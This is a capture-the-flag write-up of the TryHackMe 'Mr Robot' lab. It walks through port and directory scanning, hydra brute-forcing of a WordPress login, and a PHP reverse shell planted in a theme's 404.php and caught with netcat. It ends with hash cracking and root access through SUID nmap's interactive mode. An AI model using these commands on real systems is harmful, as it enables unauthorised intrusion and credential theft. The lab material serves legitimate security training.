Mr Robot CTF
============

## This is a CTF on [Try hack me](https://tryhackme.com)

# Recon

## Nmap

~~~
nmap -sC -sV 10.10.16.11 -Pn  

Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-31 18:12 GMT
Nmap scan report for 10.10.16.11
Host is up (0.017s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.30 seconds
~~~

## Gobuster

~~~
gobuster dir -u http://10.10.16.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.16.11
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2022/10/31 18:18:19 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 234] [--> http://10.10.16.11/images/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.16.11/]
/blog                 (Status: 301) [Size: 232] [--> http://10.10.16.11/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.16.11/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.16.11/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.16.11/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.16.11/feed/]
/video                (Status: 301) [Size: 233] [--> http://10.10.16.11/video/]
/image                (Status: 301) [Size: 0] [--> http://10.10.16.11/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.16.11/feed/atom/]
/wp-content           (Status: 301) [Size: 238] [--> http://10.10.16.11/wp-content/]
/admin                (Status: 301) [Size: 233] [--> http://10.10.16.11/admin/]
/audio                (Status: 301) [Size: 233] [--> http://10.10.16.11/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2657]
/wp-login.php         (Status: 200) [Size: 2657]
/css                  (Status: 301) [Size: 231] [--> http://10.10.16.11/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.16.11/feed/]
/license.txt          (Status: 200) [Size: 309]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 239] [--> http://10.10.16.11/wp-includes/]
/js                   (Status: 301) [Size: 230] [--> http://10.10.16.11/js/]
/wp-register.php      (Status: 301) [Size: 0] [--> http://10.10.16.11/wp-login.php?action=register]
/Image                (Status: 301) [Size: 0] [--> http://10.10.16.11/Image/]
/wp-rss2.php          (Status: 301) [Size: 0] [--> http://10.10.16.11/feed/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.16.11/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.16.11/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
~~~

## Wpscan

~~~
wpscan --url http://10.10.16.11/wp-login.php
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.16.11/wp-login.php/ [10.10.16.11]
[+] Started: Mon Oct 31 18:22:19 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.5.29
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://10.10.16.11/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://10.10.16.11/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Query Parameter In Install Page (Aggressive Detection)
 |  - http://10.10.16.11/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://10.10.16.11/wp-includes/css/dashicons.min.css?ver=4.3.1
 | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
 |  - http://10.10.16.11/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://10.10.16.11/wp-includes/css/dashicons.min.css?ver=4.3.1

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:06:08 <========================================> (137 / 137) 100.00% Time: 00:06:08

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Oct 31 18:29:58 2022
[+] Requests Done: 335
[+] Cached Requests: 4
[+] Data Sent: 89.215 KB
[+] Data Received: 19.701 MB
[+] Memory used: 217.621 MB
[+] Elapsed time: 00:07:38
~~~

# Enumeration

## Http : 80

Having a look at Gobuster we have some interesting pages to look at

### /robots

~~~
User-agent: *
fsocity.dic
key-1-of-3.txt

This is what we found on the page

We read the contents of key 1, and found a interesting wordlist on fsocity.dic with i saved into a world list for later enumeration
~~~

### /wp-login.php

~~~
This seems to be a WPS login however we found no vulnerabilities, so lets try a brute-force as the manual enumeration of the username and password displays invalid Username showing us that we can gain a valid username and potentially a valid password
~~~

## Hydra WPS 

~~~
So using Brupesuite we capture the webpage and use it for hydra 
~~~
~~~
sudo hydra -t 4 -L fsocity.dic -p test 10.10.16.11 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.16.11%2Fwp-admin%2F&testcookie=1:F=Invalid username."
~~~

### Username found
~~~
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-31 19:16:07
[DATA] max 4 tasks per 1 server, overall 4 tasks, 858235 login tries (l:858235/p:1), ~214559 tries per task
[DATA] attacking http-post-form://10.10.16.11:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.16.11%2Fwp-admin%2F&testcookie=1:F=Invalid username.
[80][http-post-form] host: 10.10.16.11   login: Elliot   password: test

Lets try for the password now
~~~
~~~
hydra -l Elliot -P fsocity_sorted.txt 10.10.16.11 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-31 19:45:49
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries (l:1/p:11452), ~382 tries per task
[DATA] attacking http-post-form://10.10.16.11:80/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username
[STATUS] 578.00 tries/min, 578 tries in 00:01h, 10874 to do in 00:19h, 30 active
[80][http-post-form] host: 10.10.16.11   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-31 20:24:07

OK we have the login now lets go see the what we have
~~~


### Wordpress login

~~~
Used reverse shell php in themes editor 404.php

loaded page /wp-content/themes/twentyfifteen/404.php to get shell
~~~

### Got shell

~~~
sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.12.24] from (UNKNOWN) [10.10.16.11] 34106
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 20:53:44 up  2:43,  0 users,  load average: 0.00, 0.10, 1.53
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ whoami
whoami
daemon
~~~

### Manual Enumeration

~~~
daemon@linux:/home/robot$ more password.raw-md5
more password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

we grabbed the contents of password.raw-md5
and throw it in john to get robot user password hopefully
~~~

### John the Ripper

~~~
john md5.hash --wordlist=fsocity.dic --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2022-10-31 21:14) 0g/s 14301Kp/s 14301Kc/s 14301KC/s 8output..ABCDEFGHIJKLMNOPQRSTUVWXYZ
Session completed.
~~~

### Privilege Escalation

~~~
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz
robot@linux:~$ 
~~~

### Manual 

~~~
find / -perm +4000

we find

/usr/local/bin/nmap

we can GTFO bins to see if we have a exploit
~~~

# Priv Esc (root)

~~~
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# 

WE ARE ROOT!!

now lastly to find the last flag in root
~~~

# Conclusion

~~~
Enjoyable box although i got stuck a few times with syntax i really enjoyed it! 

Hacked with @kubu975
~~~
